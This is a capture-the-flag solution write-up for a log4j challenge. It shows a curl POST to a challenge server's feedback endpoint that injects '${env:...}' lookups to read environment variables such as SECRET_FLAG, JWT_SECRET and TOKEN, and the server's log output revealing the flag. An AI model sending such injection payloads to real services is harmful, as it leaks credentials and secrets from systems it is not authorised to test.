# Solution

log4j read `SECRET_FLAG` env vars
```
curl -s 'http://18.212.136.134:8080/feedback' \
  -X POST \
  -d 'feedback=START|FLAG=${env:FLAG}|SECRET_FLAG=${env:SECRET_FLAG}|CTF_FLAG=${env:CTF_FLAG}|CHALLENGE_FLAG=${env:CHALLENGE_FLAG}|FLAG_FILE=${env:FLAG_FILE}|FLAG_PATH=${env:FLAG_PATH}|APP_FLAG=${env:APP_FLAG}|LOG4J_FLAG=${env:LOG4J_FLAG}|SECRET=${env:SECRET}|SECRETS=${env:SECRETS}|JWT_SECRET=${env:JWT_SECRET}|TOKEN=${env:TOKEN}|END'
```
```
{"status":"Thank you for your feedback","logs":"2025-11-22 01:12:57,252  INFO  com.logforge.FeedbackServlet - [SESSION:D2C9DCBD5679CEF54FD689B7B5BB9ECF] User feedback: 
START|FLAG=${env:FLAG}|SECRET_FLAG=PCTF{Cant_Handle_the_Feedb4ck}|CTF_FLAG=${env:CTF_FLAG}|CHALLENGE_FLAG=${env:CHALLENGE_FLAG}|FLAG_FILE=${env:FLAG_FILE}|FLAG_PATH=${env:FLAG_PATH}|AP
P_FLAG=${env:APP_FLAG}|LOG4J_FLAG=${env:LOG4J_FLAG}|SECRET=${env:SECRET}|SECRETS=${env:SECRETS}|JWT_SECRET=${env:JWT_SECRET}|TOKEN=${env:TOKEN}|END\n"}
```
Flag: `PCTF{Cant_Handle_the_Feedb4ck}`

Solved by: vicevirus
